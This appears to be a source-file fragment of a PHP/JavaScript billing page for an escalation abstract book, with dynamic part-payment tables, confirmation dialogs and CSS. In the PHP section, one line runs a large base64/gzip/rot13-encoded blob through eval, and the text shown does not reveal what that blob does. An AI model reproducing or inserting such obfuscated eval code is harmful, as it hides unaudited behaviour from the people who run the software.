					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm";
							txt_box2.id = "txt_item_rate_slm"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm";
							txt_box3.id = "txt_partpay_percent_slm"+index;
							txt_box3.value = percent;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm[]";
							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var addbtn=document.createElement("input");
								addbtn.type = "button";
								addbtn.value = " + ";
								addbtn.id = "btn_add_row_slm"+index;
								addbtn.name = "btn_add_row_slm";
								addbtn.setAttribute('class', "delbtnstyle");
								addbtn.style.width = 32+"px";
								addbtn.style.borderRadius = 0+"px";
								addbtn.onclick = function () {
												  addRow()
												}
								cell5.appendChild(addbtn);
						
						
						}
						else
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
							var delbtn=document.createElement("input");
								delbtn.type = "button";
								delbtn.value = " X ";
								delbtn.id = "btn_delete"+index;
								delbtn.name = "btn_delete";
								delbtn.setAttribute('class', "delbtnstyle");
								delbtn.style.width = 32+"px";
								delbtn.style.borderRadius = 0+"px";
								delbtn.onclick = (function (ind) {
												  //deleteRow(row.id)
												  	return function() {
													deleteRow(this);
													};
												})(index);
								cell5.appendChild(delbtn);
						}	
						
							//var cell6=row.insertCell(5);
							//cell5.style.width = 10+"px";
							//cell6.style.textAlign = "center";
							//cell6.style.padding = "0px 0px 0px 0px";
							//cell6style.visibility = "hidden";	
							
					// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
						var txt_box5 = document.createElement("input");
							txt_box5.type = "hidden";
							txt_box5.id = "hid_slm_result"+index;
							txt_box5.name = "hid_slm_result[]";
							txt_box5.value = result;
							txt_box5.setAttribute('class', "dynamictextbox");
							txt_box5.style.width = 70+"px";
							txt_box5.style.borderRadius = 0+"px";
							cell5.appendChild(txt_box5);
							index++;
						var elmt = document.getElementById("rowid0");
							elmt.style.display = "none";
							totalAmountCalculation("slm");
						//index++;
							result = "";
					}
					if(SlmRemarks != "")
					{
						document.getElementById("txt_slm_remarks").value = SlmRemarks;
					}
					else
					{
						document.getElementById("txt_slm_remarks").value = "";
					}
				}totalAmountCalculation("slm");
					//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);

			}
		}
		xmlHttp.send(strURL);	
	}
	
	function saveDataDetails()
	{
		var result1 = "X";
		$('input[name="hid_slm_result[]"]').each(function() {
			var res1 = $(this).val();
			if(res1 != "")
			{
				result1 = res1 + "@"+ result1;
			}
		});
		
		var result2 = "Y";
		$('input[name="hid_dpm_result[]"]').each(function() {
			var res2 = $(this).val();
			result2 = res2 + "@"+ result2;
		});
		//alert(result1)
		//alert(result2)
		var result = result1 + "###" + result2;
		//alert(result);
		var itemid = document.getElementById("txt_item_id").value;
		var itemStr = document.getElementById("hid_item_str"+itemid).value;
		var SlmRemarks = document.getElementById("txt_slm_remarks").value;
		var DpmRemarks = document.getElementById("txt_dpm_remarks").value;
		var RemarksStr = SlmRemarks + "*" + DpmRemarks;
		//alert(itemStr);
		var sheetid = document.getElementById("txt_sheet_id").value;
		$.post("Partpayment_Update.php", {resultdata: result, sheetid: sheetid, itemStr: itemStr, RemarksStr: RemarksStr}, function (data) {
		//alert(data);
			if(data == 1)
			{
				
				//swal("", "Sucessfully Updated...!", "success");
				location.reload();
				//$.modal.close();
				
			}
        });
		
	}
	
	function ShowRemarks(id)
	{
		var idcount = id;
		var RemarksData = document.getElementById("hid_dpm_remarkdata"+idcount).value;
		swal({
		title: "<small>Deduct Previous Measurement Remarks</small>",
		text: "<small>"+RemarksData+"</small>",
		html: true
	});
	}
	
	function SaveData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to update this data..?!",   
			type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Update!",   
			cancelButtonText: "No, Cancel!",   
			closeOnConfirm: false,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{     
				saveDataDetails();  
			} 
			else 
			{     
				swal("Cancelled", "Your data not updated:)", "error");   
			} 
		});
	}
	function CancelData()
	{
		swal({   title: "Are you sure?",   
			text: "You want to Cancel this operation..?!",   
			type: "warning",   
			showCancelButton: true,   
			confirmButtonColor: "#DD6B55",   
			confirmButtonText: "Yes, Cancel!",   
			cancelButtonText: "No, Stay on this!",   
			closeOnConfirm: true,   
			closeOnCancel: false }, 
			function(isConfirm){   
			if (isConfirm) 
			{   
				  
				$.modal.close();  
			} 
			else 
			{     
				swal({   
				title: "Please Wait!",   
				text: "Your Page will be redirected..",   
				timer: 2000,   showConfirmButton: false 
				});
			} 
		});
	}
	jQuery(function ($) 
	{
	// Load dialog on click
		$('input[name="check"]').click(function (e) 
		{
			if($(this).is(':checked'))
			{
				// THIS PART IS FOR SINCE LAST MEASUREMENT SECTION //
				var SlmTotalAmount = 0, DpmPayableAmount = 0;
				var itemdetails = this.value;
				var split_itemdetails = itemdetails.split("*");
				var subdivid 	= split_itemdetails[0];
				var subdivname 	= split_itemdetails[1];
				var description = split_itemdetails[2];
				var slm_qty		= Number(split_itemdetails[3]);
				var dpm_qty		= Number(split_itemdetails[4]);
				var rate 		= Number(split_itemdetails[5]); 
				var itemunit	= split_itemdetails[6];
				var sheetid		= split_itemdetails[7];
					document.getElementById("txt_item_no").value = subdivname;
					document.getElementById("txt_item_id").value = subdivid;
					document.getElementById("txt_item_desc").value = description;
					document.getElementById("txt_slm_qty").value = slm_qty.toFixed(3)+" "+itemunit;
					document.getElementById("txt_dpm_qty").value = dpm_qty.toFixed(3)+" "+itemunit;
					document.getElementById("txt_item_rate_slm0").value = rate.toFixed(2);
					document.getElementById("hid_slm_qty").value = slm_qty.toFixed(3);
					//var tablerow;
					//tablerow = "<tr><td>"+subdivname+"</td><td>"+description+"</td></tr>";
					//$('#table2 tr:last').after(tablerow);
					
				// THIS PART IS FOR DEDUCT PREVIOUS MEASUREMENT SECTION //
				getDPMdetaiils(sheetid,subdivid,rate);
				getSLMdetaiils(sheetid,subdivid,rate);
				
				//SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
				//DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
				//alert(SlmTotalAmount);
				//alert(DpmPayableAmount);
				//var OverAllAmount = Number(SlmTotalAmount)+Number(DpmPayableAmount);
				//document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
				
				$('#basic-modal-content').modal();
				
			}
			//return false;
		});
		
		$('#btn_save').click(function (e) 
		{
			if($('#table2 tr').size()>1)
			{
				//$('#table2 tr:last-child').remove();
				var temp = 1;
			}
			/*if(temp == 1)
			{
				$.modal.close();
				}*/
			
		});
		
	});
</script>
<style>
.pagetitle
{
	text-shadow:
    -1px -1px 0 #7F7F7F,
    1px -1px 0 #7F7F7F,
    -1px 1px 0 #7F7F7F,
    1px 1px 0 #7F7F7F; 
}
.table1
{
	color:#BF0602;
	/*color:#921601;*/
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.table1 td
{ 
	border: 1px solid #cacaca;
	border-collapse: collapse;
}
.fontcolor1
{
	color:#FFFFFF;
}

.popuptitle
{
	background-color:#0080FF;
	font-weight:bold;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:14px;
	color:#FFFFFF;
	line-height:25px;
	border:1px solid #9b9da0;
}
.table2
{
	color:#071A98;
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.table2 td
{
	border:1px solid #cacaca;
	border-collapse: collapse;
}
.bottomsection
{
 	position: absolute;
    bottom: 0;
	width:100%;
	line-height:38px;
}
.buttonsection
{
	display: inline-block;
	line-height:38px;
}
.buttonstyle
{
	background-color:#0080FF;
	width:80px;
	height:25px;
	color:#FFFFFF;
	-moz-box-shadow: 0px 1px 0px 0px #0080FF;
	-webkit-box-shadow: 0px 1px 0px 0px #0080FF;
	box-shadow: 0px 1px 0px 0px #0080FF;
	background:-webkit-gradient(linear, left top, left bottom, color-stop(0.05, #0080FF), color-stop(1, #0080FF));
	background:-moz-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-webkit-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-o-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:-ms-linear-gradient(top, #0080FF 5%, #0080FF 100%);
	background:linear-gradient(to bottom, #0080FF 5%, #0080FF 100%);
	filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#0080FF', endColorstr='#0080FF',GradientType=0);
	border:1px solid #0080FF;
	display:inline-block;
	cursor:pointer;
	font-weight:bold;

}
.buttonstyle:hover
{
	font-size:14px;
	padding: 0.1em 1em;
	-moz-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    -webkit-box-shadow: 0px 1px 4px rgba(0,0,0,5);
    box-shadow:0px 1px 4px rgba(0,0,0,5);
	background:#E80017;
	border:1px solid #E80017;
}
.popuptextbox
{
	border:none;
	font-family:Verdana;
	font-size:12px;
	font-weight:bold;
	color:#DE0117;
	text-align:center;
	pointer-events: none;
}
.dynamictextbox
{
	border:1px solid #ffffff;
	height:21px;
	color:#DE0117;
	font-weight:bold;
}
.dynamictextbox:hover, .dynamictextbox:focus
{
	/*outline: none;*/
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;
    /*border-color: #9ecaed;
    box-shadow: 0 0 10px #9ecaed;*/
}
.dynamictextbox2
{
	border:1px solid #2aade4;
	box-shadow: 0 0 7px #2aade4;
	color:#DE0117;	
}
.dynamicrowcell
{
	padding-bottom:0px;
	padding-top:0px; 
	padding-left:0px; 
	padding-right:0px;
	text-align:right;
	font:Verdana, Arial, Helvetica, sans-serif;
}
.hide
{
	display:none;
}
.labelprint
{
	font-weight:normal;
	color:#000000;
	font-family:Verdana, Arial, Helvetica, sans-serif;
	font-size:10pt;
}
@media print 
{
	.printbutton
	{
		display: none !important;
	}
}
/*.table1 tr:nth-child(even) {background: #CCC}
.table1 tr:nth-child(odd) {background: #FFF}*/
</style>		
<body bgcolor="#000000" onload="setRowSpan();noBack();" onpageshow="if (event.persisted) noBack();" onUnload="" style="padding:0; margin:0;">
<table width="1087px" height="56px" align="center" class='label' bgcolor="#0A9CC5">
	<tr bgcolor="#0A9CC5" style="position:fixed;">
		<td style="color:#FFFFFF; border:none; font-size:16px;" width="1077px"  height="48px" class="pagetitle" align="center">ESCALATION - ABSTRACT BOOK </td>
	</tr>
</table>
<form name="form" method="post" onsubmit="return confirm('Do you really want to submit the Book?');">
<?php
$page = $abstmbpage;
$title = '<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
			<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No. '.$abstmbno.'&nbsp;&nbsp;&nbsp;</td></tr>
			</table>';
echo $title;
//$Line = $Line+2;
?>
<!--<tr bgcolor="#d4d8d8" style="height:5px"><td colspan="13" style="border-top-color:#666666; border-bottom-color:#666666;height:5px"></td></tr>-->
<?php 

//$sheetid	=  $_GET['sheetid'];
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

for($k1=0; $k1<count($expAllMonRbnStr); $k1++)
{
	$AllMonRbn 		= $expAllMonRbnStr[$k1];
	$expAllMonRbn 	= explode("*",$AllMonRbn);
	$expRbn 	= $expAllMonRbn[0];
	$expMonth 	= $expAllMonRbn[1];
	//echo $expMonth."<br/>";
	if(in_array($expMonth, $NonExistMonthList))
	{
		// So dont take this rbn because this rbn's period is out of escalation period
		array_push($NotSelRbnArr,$expRbn);
	}
	else
	{
		$SelRbnStr .= $expRbn."*";
		array_push($SelRbnArr,$expRbn);
	}
}
$UniqSelRbnArr 		= array_values(array_unique($SelRbnArr)); 
$UniqNotSelRbnArr 	= array_values(array_unique($NotSelRbnArr)); 
$RBNarr_1 = array_values(array_diff($UniqSelRbnArr,$UniqNotSelRbnArr));
// array_diff will remove the element which exist in both array and return first array
// array_values will set the array index key value as from beginning i.e a[0], a[1], a[2]...
sort($RBNarr_1, SORT_NUMERIC); 
$arr_1Cnt = count($RBNarr_1);
$slm_rbn = $arr_1[$arr_1Cnt-1];
//print_r($UniqNotSelRbnArr);
//echo $slm_rbn;
//$Line = $Line+2;
// $subdivisionlist_2 = "";
$DevItemArray = array();
$WoQtyItemArr = array();
for($k2=0; $k2<$arr_1Cnt; $k2++)
{
